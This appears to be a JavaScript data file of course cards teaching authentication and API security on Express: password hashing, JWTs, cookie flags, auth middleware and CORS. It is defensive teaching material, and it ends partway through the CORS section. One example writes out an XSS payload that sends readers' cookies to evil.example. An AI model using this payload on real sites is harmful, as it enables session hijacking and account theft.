'use strict';
/* Authentication and security: concept cards, rail groups and self-check quiz (bcrypt,
   jsonwebtoken, cors, Zod and helmet on Express as the worked example). Prerequisites are linked
   in prose, not repeated. See site/README.md for the data contract.
   `live` boxes run in a Web Worker. `hub` and `topic` keys match AUTH_GROUPS and AUTH_QUIZ_TOPICS. */

DATA.en.AUTH_QUIZ_TOPICS = {
  identity: 'Authentication and authorisation',
  passwords: 'Password storage',
  tokens: 'Sessions and tokens',
  cors: 'CORS',
  hardening: 'Hardening the API',
};

DATA.en.AUTH_GROUPS = [
  { key: 'identity', label: 'Who are you, what may you do', icon: 'key' },
  { key: 'passwords', label: 'Passwords', icon: 'lock' },
  { key: 'tokens', label: 'Sessions and tokens', icon: 'doc' },
  { key: 'cors', label: 'CORS', icon: 'web' },
  { key: 'hardening', label: 'Hardening the API', icon: 'shield' },
];

DATA.en.AUTH_CONCEPTS = [
  /* ---- 1. Authentication and authorisation ------------------------------------------ */
  { id: 'authn-vs-authz', hub: 'identity', topic: 'identity', 
    title: 'Authentication vs authorisation',
    summary: '**Authentication** answers "who is calling?"; **authorisation** answers "may this caller do this, to this resource?". Failing the first gives `401`; failing the second gives `403`.',
    body: [
      'Think of a concert. At the entrance a steward checks your ID against your ticket: that is **authentication**, proving you are who you claim to be. Inside, the wristband decides whether you may go backstage: that is **authorisation**. A perfectly valid ID does not get you backstage, and a backstage pass is useless if nobody knows who is wearing it.',
      'An API asks both questions on every protected request, always in this order. First an **auth middleware** (a function that runs before the route; see [Middleware](#/server/routes/middleware)) reads the token and works out who is calling. If it cannot, the request stops there with `401` and no route code runs. Then the controller (or a role middleware) decides whether that user may act on this particular resource; if not, `403`.',
      'Recall from How the web works: `401 Unauthorized` is badly named, it really means **unauthenticated** ("log in first"). `403 Forbidden` means "I know who you are, and the answer is no": logging in again will not help.',
    ],
    table: {
      caption: 'The two questions',
      head: ['', 'Authentication', 'Authorisation'],
      rows: [
        ['Question', 'Who is calling?', 'May this caller do this to this resource?'],
        ['Evidence', 'A password at log-in, then a token or session cookie', 'The user id and role from the verified token, plus the resource\'s owner'],
        ['Where in an Express API', '`middleware/auth.js` (sets `req.user`)', 'Each controller action (compares `req.user.sub` with `task.user_id`)'],
        ['On failure', '`401` (missing, invalid or expired token)', '`403` (valid token, not yours or not allowed)'],
      ],
    },
    example: 'A Tasks API\'s `GET /tasks/7`: with no `Authorization` header → **401** `Missing token`; with an expired token → **401**; with Ana\'s valid token when task 7 belongs to Ben → **403**; with Ana\'s token for her own task 7 → **200**; with any valid token for task 999, which does not exist → **404**.',
    mistake: 'Answering `403` for a missing token, or `401` for "not your task". The client reacts to each code differently: on `401` it sends the user to the log-in page; on `403` it shows "not allowed". Mixing them up sends logged-in users to a log-in page that cannot help them, and it is one of the most common mistakes in hand-written APIs.' },

  { id: 'ownership-checks', hub: 'identity', topic: 'identity', 
    title: 'Ownership and roles: a valid token is not a free pass',
    summary: 'An **ownership check** compares the user in the verified token (`req.user.sub`) with the owner stored on the resource before reading or changing it; a **role check** asks whether the user\'s role (for example `admin`) permits the action at all.',
    body: [
      'A hotel key card is genuine (you are authenticated), but it opens only your room. Now imagine a hotel whose doors only check "is this a genuine card?": any guest could open any room. In an API the room number is the id in the URL, so a server that only checks the token lets Ana read Ben\'s data by typing `/tasks/8` instead of `/tasks/7`. This is **broken access control**, also called IDOR (insecure direct object reference), and it is the number one risk in the OWASP Top 10.',
      'The rule has two halves. **The owner always comes from the verified token**, never from the body, query or URL: on create you store `req.user.sub`; a `userId` sent by the client is ignored. **Every read, update and delete of one resource loads it and compares owners** before doing anything (404 if it does not exist, 403 if it is not yours). For lists, filter in the database query itself (`findByOwner(req.user.sub, …)`) so other people\'s rows never leave the database.',
      'The two values must have the same type before you compare them. A JWT payload can carry `sub` as a number (`42`), while a database driver may return the owner column as a string (`"42"`, as `pg` does for `BIGINT` columns), and `42 !== "42"` is `true`. That is why a safe check reads `Number(task.user_id) !== Number(req.user.sub)`.',
      'Roles add a second layer. A typical JWT also carries `role` (`user` or `admin`). A small middleware such as `requireAdmin` can refuse a whole route to non-admins with `403`; ownership then decides which records an ordinary user may touch.',
    ],
    code: `// A notes API (the same pattern works for tasks): load, 404, then 403.
async function getNote(req, res, next) {
  try {
    const note = await notesModel.findById(Number(req.params.id));
    if (!note) return res.status(404).json({ error: 'Note not found' });
    if (Number(note.owner_id) !== Number(req.user.sub)) {
      return res.status(403).json({ error: 'This note is not yours' });
    }
    res.json(toDTO(note));
  } catch (err) {
    next(err);
  }
}

// A role check: a middleware factory used after auth.
const requireRole = (role) => (req, res, next) =>
  (req.user.role === role ? next() : res.status(403).json({ error: 'Forbidden' }));

router.delete('/:id', requireRole('admin'), deleteNote);`,
    example: 'Ana (`sub: 1`) sends `PUT /notes/8`; note 8 has `owner_id: 2`. Her token is perfect, so `auth` lets her through, and the controller answers **403**. She then sends `POST /notes` with the body `{"title":"Hi","userId":2}`: the server ignores `userId` and stores the note with owner `1`, the `sub` from her token.',
    mistake: 'Taking the owner from the request: `create({ ...req.body })` or `findByOwner(req.query.userId)`. Anything the client sends can be changed by the client; only the verified token says who is calling. A second classic: comparing ids with `!==` without converting them, so every owner gets `403` (or, with `!=`, getting lucky without understanding why).' },

  /* ---- 2. Passwords ------------------------------------------------------------------ */
  { id: 'hash-not-encrypt', hub: 'passwords', topic: 'passwords', 
    title: 'Store a hash, never the password',
    summary: 'A **hash function** turns a password into a fixed-length fingerprint that cannot be turned back into the password; the server stores only the fingerprint and checks a log-in by hashing the attempt again and comparing.',
    body: [
      'Compare a fingerprint with a locked box. **Encryption** is a locked box: whoever has the key opens it and gets the original back, and on a web server the key sits on the same machine an attacker breaks into. **Hashing** is a fingerprint: you can check whether a finger matches a print, but you cannot rebuild the finger from the print. It is **one-way**.',
      'Why bother? Databases leak: a stolen backup, an SQL injection, a misconfigured admin panel. People reuse passwords, so a leak of plaintext passwords also opens their email and bank accounts. With hashes, the attacker gets only fingerprints and has to **guess** passwords one by one.',
      'Two properties make this work. The same input always gives the same output, so the server can compare. A tiny change gives a completely different output, so a near-miss reveals nothing. But ordinary fast hashes (MD5, SHA-1 and also **SHA-256**) are the wrong tool for passwords because they are built to be fast, which helps the guesser. Password hashes (bcrypt, argon2) add a salt and a cost: see the next card.',
      'Treat the hash as sensitive too: never return it in a response (a `usersModel.create` should return `id, email, role` only), never put it in a token, and never log request bodies on `/auth` routes, or the plaintext password ends up in your log files.',
    ],
    table: {
      caption: 'Three ways to keep a password, from worst to right',
      head: ['', 'Plaintext', 'Encrypted', 'Password hash (bcrypt)'],
      rows: [
        ['Stored value', '`hunter2`', 'Ciphertext + a key on the server', '`$2b$10$…` (60 characters)'],
        ['Can it be turned back?', 'It is the password', 'Yes, by anyone with the key', 'No: only guessed'],
        ['Log-in check', 'Compare strings', 'Decrypt and compare', 'Hash the attempt and compare (`bcrypt.compare`)'],
        ['After a database leak', 'Every password is known', 'Every password, if the key leaks too', 'Each password must be guessed, slowly'],
      ],
    },
    example: 'SHA-256 of `hunter2` is `f52fbd32…26a3f6c7`; of `hunter3` it is `fb8c2e2b…21cfa57a`: one character apart, nothing in common. A site whose "forgot password" email sends you **your old password** is storing it reversibly; the right flow emails a one-time reset link instead.',
    mistake: '"Encrypting passwords with a secret key is safer than hashing." It is worse: the key has to live next to the data so the server can decrypt, and an attacker who gets the database usually gets the key too. Nobody, not even the server, ever needs to read a password back.' },

  { id: 'salt-and-cost', hub: 'passwords', topic: 'passwords', 
    title: 'Salt and cost: why bcrypt is slow on purpose',
    summary: 'A **salt** is a random value stored with each hash so that equal passwords get different hashes; a **cost factor** makes each hash deliberately slow, so an attacker can try far fewer guesses per second.',
    body: [
      'Picture an attacker with a stolen users table. They take a list of likely passwords (`123456`, `qwerty`, `ana2005`…) and, for each, compute the hash and look for it in the table. Two defences make this expensive. The **salt** forces them to repeat the work separately for every user and makes precomputed tables (hash → password lists, "rainbow tables") useless. The **cost** multiplies the time of every single guess. Your users log in once a day, so 100 ms is invisible to them; the attacker needs billions of guesses, and 100 ms each turns hours into centuries.',
      '**bcrypt** does both for you. `bcrypt.hash(password, 10)` generates a fresh random salt and embeds it, with the cost, in the 60-character result: `$2b$` (version) `10$` (cost) then 22 characters of salt and 31 of hash. That is why the users table needs only one `password_hash` column and why `bcrypt.compare(attempt, hash)` needs no separate salt.',
      'The **cost factor** is an exponent: cost 10 means 2^10 rounds of bcrypt\'s expensive inner step, and every +1 **doubles** the time. OWASP asks for at least 10; choose the highest value that keeps one log-in at a few hundred milliseconds on your server, and raise it as hardware gets faster (old hashes keep working, because each one stores its own cost).',
      '**argon2** (argon2id) won the Password Hashing Competition in 2015 and is OWASP\'s first choice today: besides time it needs a lot of **memory** per guess, which hurts attackers using graphics cards (GPUs). bcrypt remains a good default in Node. Note that bcrypt only uses the first 72 bytes of a password.',
    ],
    code: `const bcrypt = require('bcrypt');   // npm install bcrypt (bcryptjs has the same API)

// sign-up: a new random salt every time
const hash = await bcrypt.hash('correct horse battery staple', 10);
// e.g. '$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'
//   '$2b$' version · '10$' cost · then 22 chars of salt and 31 chars of hash

// log-in: re-hash the attempt with the salt and cost stored in the hash
await bcrypt.compare('correct horse battery staple', hash);   // true
await bcrypt.compare('Correct horse battery staple', hash);   // false`,
    example: 'Two users both choose `123456`. Unsalted SHA-256 stores the same value twice, `8d969eef6ecad3c2…`, and a web search for it reveals the password: crack one, crack both. With bcrypt the two rows look completely unrelated. In the tool below, hash a password at 2^16 and then 2^18 iterations: the time roughly quadruples, and so does the attacker\'s.',
    mistake: 'Thinking the salt must be kept secret, or storing it "safely" elsewhere. A salt is not a secret: its only job is to be **different for every user**. Using one fixed salt for everybody defeats that job, because equal passwords become equal hashes again.',
    widget: 'hash-cost' },

  { id: 'login-flow', hub: 'passwords', topic: 'passwords', 
    title: 'Register and log in, step by step',
    summary: '**Registering** validates the input, hashes the password and stores the user; **logging in** finds the user by email, compares the password with `bcrypt.compare` and, if it matches, issues a signed token that the client sends on later requests.',
    body: [
      'Think of joining a gym. Registration is filling in the form: they check it, keep a fingerprint of your PIN (never the PIN), and you get a member number. Logging in is arriving at reception: they check the fingerprint once and give you a **day pass** (the token), so you do not have to prove who you are at every door inside.',
      'Registration, step by step: check that `email` is a non-empty string and `password` has at least 8 characters (`400` otherwise); if the email exists, `409 Conflict`; hash with `bcrypt.hash(password, 10)`; store; answer `201` with `{ id, email }` only.',
      'Log-in: look the user up by email; if there is none, or `bcrypt.compare` says false, answer `401` with **the same message** (`Invalid credentials`) in both cases. Different messages ("no such email" vs "wrong password") let an attacker discover which emails have accounts (**account enumeration**). On success, sign `{ sub: user.id, role: user.role }` with `expiresIn: "1h"` and answer `200 { token }`.',
      'Both handlers are `async` because the database and bcrypt return promises. In Express 4 an error thrown after an `await` is not caught for you: wrap the body in `try/catch` and call `next(err)` (Express 5 forwards rejected promises to the error handler automatically).',
    ],
    code: `// The heart of the log-in check: one answer for both failure cases.
const user = await usersModel.findByEmail(email);       // null if unknown
const ok = user !== null && (await bcrypt.compare(password, user.password_hash));
if (!ok) return res.status(401).json({ error: 'Invalid credentials' });
// … sign the token and answer 200 { token }`,
    example: 'Ana registers with `{"email":"ana@example.com","password":"password1"}` → **201** `{"id":1,"email":"ana@example.com"}`. Registering again → **409**. Logging in with `password2` → **401** `Invalid credentials`; with an unknown email → the same **401**. With the right password → **200** `{"token":"eyJhbGciOiJIUzI1NiIs…"}`, which she then sends as `Authorization: Bearer eyJ…` on every `/tasks` request.',
    mistake: 'Calling `bcrypt.compare(password, user.password_hash)` without checking that `user` exists. For an unknown email `user` is `null`, reading `.password_hash` throws a `TypeError`, and the client gets `500` instead of `401` (many tutorial snippets have this bug). Also wrong: `password === user.password_hash`, which compares a password with a hash and is never true.' },

  /* ---- 3. Sessions and tokens --------------------------------------------------------- */
  { id: 'sessions-vs-tokens', hub: 'tokens', topic: 'tokens', 
    title: 'Remembering who you are: sessions vs tokens',
    summary: 'Because HTTP is stateless, after logging in the client must prove who it is on **every** request: either with a random **session id** in a cookie, which the server looks up, or with a signed **token** (a JWT) that carries the identity itself.',
    body: [
      'Compare a cloakroom ticket with a passport. A **session id** is a cloakroom ticket: a random number that means nothing by itself; the server keeps the list of who each number belongs to (the session store). A **JWT** is a passport: the information is written on it, and an official stamp (the signature) proves it is genuine, so the guard needs no list at all.',
      'Either way, something must travel with every request, because HTTP is **stateless** (see How the web works): the server does not remember your previous request. With sessions the browser sends the cookie automatically; with JWTs your JavaScript adds an `Authorization: Bearer <token>` header (a JWT can also travel in a cookie).',
      'The choice is a set of trade-offs, not "old vs better". **Revocation**: deleting a session row logs the user out at once, while a JWT stays valid until it expires (hence short expiry times, or a denylist of revoked token ids). **Server state**: sessions need a store, shared by every server instance if you run several (often Redis); JWTs need nothing stored. **Size**: a session id is about 30 characters; a JWT is hundreds of bytes, sent on every request. JSON APIs consumed by a separate front end often pick JWTs; server-rendered sites often keep sessions.',
    ],
    table: {
      caption: 'Server sessions vs JWT',
      head: ['', 'Server session', 'JWT'],
      rows: [
        ['What the client holds', 'A random id that means nothing alone', 'A signed token with the user id, role and expiry inside'],
        ['Server keeps', 'One row per active session', 'Nothing (only the signing secret)'],
        ['Each request', 'Look the id up in the store', 'Verify the signature (no lookup)'],
        ['Log out / ban now', 'Delete the row: immediate', 'Hard: the token works until `exp` (or keep a denylist)'],
        ['Several servers', 'Need a shared store', 'Work out of the box (same secret)'],
        ['Usual transport', 'Cookie, sent automatically', '`Authorization: Bearer` header, added by your code'],
      ],
    },
    example: 'Ana clicks "log out". With sessions, the server deletes row `s_8f3a…`, and the next request with the old cookie gets **401** immediately. With JWTs, the front end throws its copy of the token away; but if an attacker had copied it, it keeps working until its `exp`, up to an hour with `expiresIn: "1h"`.',
    mistake: '"JWTs are more secure than sessions" (or the reverse). Neither is: they move the problem. A stolen JWT works like a password until it expires, and you cannot cancel it easily; a session needs a server-side store that every request must reach.' },

  { id: 'cookie-flags', hub: 'tokens', topic: 'tokens', 
    title: 'Cookies and their security flags',
    summary: 'A **cookie** is a small `name=value` that a server asks the browser to keep (`Set-Cookie`) and that the browser sends back automatically (`Cookie`); the flags **HttpOnly**, **Secure** and **SameSite** limit who can read it and when it is sent.',
    body: [
      'A cookie is like a wristband the browser wears at one venue: it shows it at every door without you doing anything. That convenience is also the danger: the browser shows the wristband even when **another site** makes it knock on the door. The flags exist to limit that.',
      '**HttpOnly**: JavaScript cannot read the cookie (`document.cookie` does not show it), so a script injected into the page (XSS, see [textContent vs innerHTML](#/browser/dom/text-vs-html)) cannot steal it. **Secure**: sent only over HTTPS, never over plain HTTP. **SameSite**: whether the cookie goes along on requests started by **another site**. `Strict` never; `Lax` (the default in modern browsers) only when the user navigates to your site, such as clicking a link, not on another site\'s background `fetch` or form POST; `None` always, and then `Secure` is required.',
      'The attack SameSite blocks is **CSRF** (cross-site request forgery): a malicious page makes your browser send a request to a site where you are logged in, cookies included, for example a hidden form that posts to `/transfer`. Tokens in an `Authorization` header are not sent automatically, so they are not exposed to CSRF; but if they are kept in `localStorage`, an XSS can read them.',
      'Without `Max-Age` or `Expires`, a cookie is a "session cookie" and disappears when the browser closes.',
    ],
    code: `// Express 4: after a successful log-in with a server-side session
res.cookie('sid', sessionId, {
  httpOnly: true,           // invisible to JavaScript
  secure: true,             // HTTPS only
  sameSite: 'lax',          // not sent on other sites' fetch / form POSTs
  maxAge: 60 * 60 * 1000,   // in milliseconds here (1 hour)
});
// Response header:
// Set-Cookie: sid=8f3a…; Max-Age=3600; Path=/; Expires=…; HttpOnly; Secure; SameSite=Lax`,
    example: 'A forum shows comments with `innerHTML`, and someone posts `<img src="x" onerror="fetch(\'https://evil.example/?c=\' + document.cookie)">`. Without HttpOnly, every reader\'s session id is sent to the attacker, who can then act as them. With HttpOnly, `document.cookie` does not contain `sid` and the theft fails (the real fix is still to stop the XSS).',
    mistake: 'Thinking HttpOnly makes a cookie "safe". It stops scripts from **reading** it, but the browser still **sends** it, so CSRF is still possible (that is SameSite\'s job), and an XSS can still make requests as the user from inside the page.' },

  { id: 'jwt-structure', hub: 'tokens', topic: 'tokens', 
    title: 'Anatomy of a JWT',
    summary: 'A **JSON Web Token** is three base64url strings joined by dots, `header.payload.signature`: the header names the signing algorithm, the payload holds the **claims** (statements such as the user id and the expiry time), and the signature proves that the first two have not been changed.',
    body: [
      'Picture an envelope with a clear window and a wax seal. Anyone can read the letter through the window: the header and payload are only **encoded**, not encrypted. But the seal breaks if anyone changes a word: that is the signature. So a JWT is **readable by everyone and trustworthy only to whoever can check the seal**, which is the server holding the secret.',
      '**base64url** is a way to write any bytes using only 64 URL-safe characters (`A–Z a–z 0–9 - _`), so the token fits in a header or a URL. Anyone can reverse it (try `atob` in the browser console). It differs from ordinary base64 in two details: `-` and `_` replace `+` and `/`, and the `=` padding is dropped.',
      'The payload is a JSON object of **claims**. Standard ones have three-letter names; your API can add its own, such as `role`. Times are **seconds** since 1 January 1970 UTC ("Unix time"), not milliseconds like `Date.now()` in JavaScript.',
    ],
    table: {
      caption: 'Claims you will meet (a typical log-in token has sub, role, iat and exp)',
      head: ['Claim', 'Name', 'Meaning', 'Who sets it'],
      rows: [
        ['`sub`', 'Subject', 'Who the token is about: the user id. Becomes `req.user.sub`.', 'You: `jwt.sign({ sub: user.id, … })`'],
        ['`iat`', 'Issued at', 'When it was signed (Unix seconds).', '`jwt.sign`, automatically'],
        ['`exp`', 'Expiration', 'After this moment `jwt.verify` throws `jwt expired`.', '`jwt.sign` with `expiresIn: "1h"` → `iat + 3600`'],
        ['`nbf`', 'Not before', 'Not valid before this moment.', 'Optional (`notBefore`)'],
        ['`iss` / `aud`', 'Issuer / audience', 'Who issued it / who it is meant for.', 'Optional'],
        ['`role`', '(custom)', 'Your own claim: lets routes check permissions without a database lookup.', 'You'],
      ],
    },
    example: 'The example token on jwt.io starts `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`, which decodes to the header `{"alg":"HS256","typ":"JWT"}`. Its payload is `{"sub":"1234567890","name":"John Doe","iat":1516239022}`: `iat` is 18 January 2018, 01:30:22 UTC. It has no `exp`, so it never expires, which you would never do in a real API. Paste it into the inspector below and change one character.',
    mistake: 'Putting secrets in the payload ("it is a token, so it is hidden"): a password hash, another user\'s data, an internal API key. Anyone who sees the token can decode it in one line. A second classic: `exp: Date.now() + 3600`, which is in **milliseconds**, so the token expires in about 56,000 years.',
    widget: 'jwt-inspector' },

  { id: 'jwt-sign-verify', hub: 'tokens', topic: 'tokens', 
    title: 'Signing and verifying: what the secret does',
    summary: 'With **HS256**, `jwt.sign` computes an HMAC-SHA-256 of `header.payload` using a secret that only the server knows; `jwt.verify` recomputes it and rejects the token if the result differs, if the algorithm is not the expected one, or if the token has expired.',
    body: [
      'Think of a signature as a checksum only the secret-holder can compute. If anyone changes a single character of the payload, the correct signature for the new payload is completely different, and without the secret they cannot compute it. The server does not "decrypt" anything: it simply recomputes the signature and compares.',
      'An **HMAC** is a hash mixed with a secret key. **HS256** means HMAC with SHA-256. It is **symmetric**: the same secret signs and verifies, so it must never leave the server (it lives in `process.env.JWT_SECRET`). The alternative **RS256** signs with a private key and verifies with a public key, used when other services must check tokens without being able to create them.',
      '**Signing is not encrypting.** A signature protects **integrity** (nobody changed it), not **confidentiality** (nobody can read it). Encrypted tokens exist (JWE) but are rarely needed for a log-in token.',
      'The JWT standard also allows `"alg": "none"`, an unsigned token. Libraries that trusted the header\'s `alg` once accepted forged tokens this way. `jsonwebtoken` 9 refuses unsigned tokens when you pass a secret; passing `{ algorithms: [\'HS256\'] }` makes the rule explicit. `jwt.verify` throws `TokenExpiredError` (`jwt expired`), `NotBeforeError` (`jwt not active`) or `JsonWebTokenError` (`invalid signature`, `jwt malformed`, …).',
    ],
    code: `const jwt = require('jsonwebtoken');

// at log-in
const token = jwt.sign({ sub: user.id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '1h' });

// on every protected request
try {
  const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  // payload → { sub: 42, role: 'user', iat: 1791158400, exp: 1791162000 }
} catch (err) {
  // err.name → 'TokenExpiredError' | 'NotBeforeError' | 'JsonWebTokenError'
}

// A strong random secret (run once, put the output in .env):
// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"`,
    example: 'Ana decodes her token, changes `"role":"user"` to `"role":"admin"`, encodes it again and sends it. The server recomputes HMAC-SHA-256 over the new header and payload with its secret; the result does not match the old signature still attached, so `jwt.verify` throws `invalid signature` and the middleware answers **401**. Try it with the **Tamper** button of the inspector.',
    mistake: 'Using `jwt.decode(token)` in the middleware instead of `jwt.verify(token, secret)`. `decode` only reads the payload and checks nothing, so anyone can write a token saying `role: admin`. Another: a short secret such as `secret` or `riverside123`. Anyone holding one token can try millions of candidate secrets offline until the signature matches; use 32 random bytes.',
    practice: { href: '#/server/auth/practice/jwt-inspector', label: 'Sign and verify tokens in the JWT inspector' } },

  { id: 'token-transport', hub: 'tokens', topic: 'tokens', 
    title: 'Sending, storing and expiring tokens',
    summary: 'The client sends the token on every protected request in the `Authorization: Bearer <token>` header; it has to keep it somewhere in between, and the `exp` claim limits how long a stolen copy stays useful.',
    body: [
      'A token is a day pass: the shorter it lasts, the less a thief can do with it, but too short and people queue at reception all day. **Bearer** means "whoever bears (holds) this token is treated as its owner", with no further proof. So tokens travel only over HTTPS, never in URLs (URLs end up in history and server logs), and they expire.',
      'Where a browser app keeps the token is a trade-off. **In memory** (a JavaScript variable): gone on reload, hardest to steal. **localStorage**: survives reloads, but any script running on the page, including an injected one (XSS), can read it. **An HttpOnly cookie**: invisible to scripts, but sent automatically, so you need SameSite and CORS with credentials. The HttpOnly cookie is the safer default for browser clients; many tutorials use localStorage, so know what you are giving up.',
      'Expiry is your only built-in revocation; one hour is a common choice. "Logging out" with a JWT means the client deletes its copy. Larger apps pair a short-lived access token (minutes) with a long-lived **refresh token** in an HttpOnly cookie that can be revoked on the server; that design is beyond this card.',
    ],
    code: `// Front end: log in, keep the token, send it back
const login = await fetch('http://localhost:3000/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
});
if (!login.ok) throw new Error('Wrong email or password');
const { token } = await login.json();

const res = await fetch('http://localhost:3000/tasks', {
  headers: { Authorization: \`Bearer \${token}\` },
});
// From a terminal: curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/tasks`,
    example: 'A token signed at 10:00:00 with `expiresIn: "1h"` has `exp` = 11:00:00. A request at 10:59:59 passes; at 11:00:00 exactly `jwt.verify` throws `jwt expired` (the check is "now ≥ exp"), the API answers **401**, and the front end should send the user back to the log-in form. Shift the clock in the inspector to watch it happen.',
    mistake: 'Getting the header format wrong: `Authorization: eyJ…` (no `Bearer `), `Bearer: eyJ…` (a header called Bearer), or `?token=eyJ…` in the URL. The middleware in the next card only accepts a value that starts with `Bearer ` followed by the token, and treats anything else as a missing token (**401**).' },

  { id: 'auth-middleware', hub: 'tokens', topic: 'tokens', 
    title: 'The auth middleware: one gate in front of many routes',
    summary: 'An **auth middleware** runs before the protected routes: it reads the `Authorization` header, verifies the token, stores the decoded payload in `req.user` and calls `next()`, or stops the request with `401`.',
    body: [
      'Instead of checking tickets at every door, put one ticket check at the entrance of the corridor. `app.use(\'/tasks\', auth, tasksRouter)` means no handler inside the tasks router runs unless `auth` called `next()`. Every handler behind it can then rely on `req.user.sub` being the caller\'s id (middleware basics, `req, res, next`, are in [Middleware](#/server/routes/middleware)).',
      'The order of `app.use` lines matters. The routes that hand out tokens (`/auth/register`, `/auth/login`) are mounted **without** `auth`, or nobody could ever log in. `cors` (if you need it) goes **before** `auth`, because the browser\'s CORS preflight never carries the token (see Preflight requests). The error handler stays last.',
      'The middleware answers only **401**: it knows who you are, not what you may do. The **403** decisions (ownership, roles) belong to the controllers or to a role middleware placed after it. `jwt.verify` without a callback is synchronous, so a plain `try/catch` catches every failure.',
    ],
    code: `// middleware/auth.js
const jwt = require('jsonwebtoken');

function auth(req, res, next) {
  const header = req.headers.authorization || '';   // Node lower-cases header names
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Missing token' });
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// app.js
app.use('/auth', authRouter);           // open: this is where tokens come from
app.use('/tasks', auth, tasksRouter);   // every /tasks route is behind the gate`,
    table: {
      caption: 'Three requests to `GET /tasks`',
      head: ['Request header', 'What auth does', 'Result'],
      rows: [
        ['(none)', '`token` is `null`', '**401** `Missing token`; the router never runs'],
        ['`Authorization: Bearer abc`', '`jwt.verify` throws `jwt malformed`', '**401** `Invalid or expired token`'],
        ['`Authorization: Bearer eyJ…` (valid)', '`req.user = { sub: 42, role: \'user\', iat, exp }`, then `next()`', 'The tasks controller runs with `req.user`'],
      ],
    },
    example: 'Ana\'s React page calls `GET /tasks?page=2` with her token. `auth` verifies it and sets `req.user.sub = 1`; the list controller then asks the model for **her** tasks only (`findByOwner(1, { limit, offset })`). Ben\'s token on the same URL gives Ben\'s tasks: same route, different `req.user`.',
    mistake: 'Forgetting `return` before `res.status(401).json(…)`. The function keeps going, reaches `next()` and the protected route runs anyway, usually followed by the error "Cannot set headers after they are sent to the client". Calling `next()` inside the `catch` has the same effect.' },

  /* ---- 4. CORS ----------------------------------------------------------------------- */
  { id: 'same-origin-policy', hub: 'cors', topic: 'cors', 
    title: 'Origins and the same-origin policy',
    summary: 'An **origin** is the scheme + host + port of a URL; the browser\'s **same-origin policy** lets a page\'s JavaScript read responses freely only from its own origin.',
    body: [
      'You are logged in to your bank in one tab; another tab has a random site open. If that site\'s JavaScript could `fetch` your bank\'s pages, with your cookies, and **read** them, it could read your account. The same-origin policy is the browser protecting **the user** from other sites. It is a rule the browser enforces, not something your server does.',
      'Two URLs have the same origin only if **all three** parts match: scheme, host and port (the default port counts when none is written, see URL anatomy). The path does not matter. `localhost` and `127.0.0.1` are the same machine but **different hosts**, so they are different origins.',
      'What the policy blocks is **reading** cross-origin responses from JavaScript (`fetch`). It does not block a page from **embedding** other origins (`<img>`, `<script src>`, stylesheets) or from submitting forms and following links to them; that is how the web has always worked. And many cross-origin requests are still **sent**: the browser just refuses to hand the answer to the script.',
      'A common development setup is cross-origin: React with Vite on `http://localhost:5173` calling Express on `http://localhost:3000`. That is why the API needs CORS (next card). Serving the page from Express itself with `express.static` avoids the problem, because page and API then share one origin.',
    ],
    table: {
      caption: 'Compared with `http://localhost:3000/api/tasks`',
      head: ['URL', 'Same origin?', 'Why'],
      rows: [
        ['`http://localhost:3000/index.html`', 'Yes', 'Only the path differs'],
        ['`http://localhost:5173/`', 'No', 'Port 5173 ≠ 3000'],
        ['`https://localhost:3000/`', 'No', 'Scheme https ≠ http'],
        ['`http://127.0.0.1:3000/`', 'No', 'Host 127.0.0.1 ≠ localhost (same machine, different name)'],
        ['`http://localhost/`', 'No', 'No port written means 80 ≠ 3000'],
      ],
    },
    example: 'The page at `http://localhost:5173` runs `fetch(\'http://localhost:3000/api/tasks\')`. The ports differ, so it is cross-origin. With no CORS configured, the Express terminal still logs `GET /api/tasks`: the request arrived and the route ran. But the browser console shows a CORS error and the page\'s `fetch` rejects with `TypeError: Failed to fetch`.',
    mistake: '"The same-origin policy stops the request from reaching the server." For simple requests it does not: the server receives and executes them, and only the response is hidden. That is one more reason why a `GET` must never change data, and why CORS settings are no replacement for authentication.' },

  { id: 'cors-headers', hub: 'cors', topic: 'cors', 
    title: 'CORS: the server says who may read',
    summary: '**CORS** (Cross-Origin Resource Sharing) is a set of HTTP response headers with which a server tells the browser which other origins may read its responses; the key one is `Access-Control-Allow-Origin`.',
    body: [
      'Think of a guest list written by the API and checked by the browser. On a cross-origin request the browser adds `Origin: http://localhost:5173`. The API answers with `Access-Control-Allow-Origin: http://localhost:5173` (or `*`, meaning anyone). The browser compares: if they match, the page\'s JavaScript gets the response; if the header is missing or different, it does not.',
      'A **simple request** is one an old-fashioned HTML form could already send: method `GET`, `HEAD` or `POST`, only "safelisted" headers (such as `Accept`), and, if there is a body, a `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`. The browser sends simple requests straight away and checks the CORS headers on the answer. Anything else (a `PUT`, a JSON body, an `Authorization` header) is first checked with a **preflight** (next card).',
      'In Express you add the headers with the `cors` package (`npm install cors`; it is not part of Express). `app.use(cors())` with no options sends `Access-Control-Allow-Origin: *` on every route: fine for a public, read-only API, too wide for one with user accounts. Pass `origin` with the exact front-end origin, or an array of them. Mount it **before** the routers.',
    ],
    code: `const cors = require('cors');            // npm install cors

app.use(cors({ origin: 'http://localhost:5173' }));   // before the routers (and before auth)
app.use(express.json());
app.use('/api/tasks', tasksRouter);

// The exchange it produces:
// GET /api/tasks HTTP/1.1
// Origin: http://localhost:5173
//
// HTTP/1.1 200 OK
// Access-Control-Allow-Origin: http://localhost:5173
// Vary: Origin            ← caches must keep one copy per Origin
// Content-Type: application/json; charset=utf-8`,
    example: 'With `cors({ origin: \'http://localhost:5173\' })`, the React page reads the tasks. A page on `https://evil.example` making the same call gets `Access-Control-Allow-Origin: http://localhost:5173`, which does not match its own origin, so the browser blocks it with the message "…has a value \'http://localhost:5173\' that is not equal to the supplied origin". Try both in the simulator.',
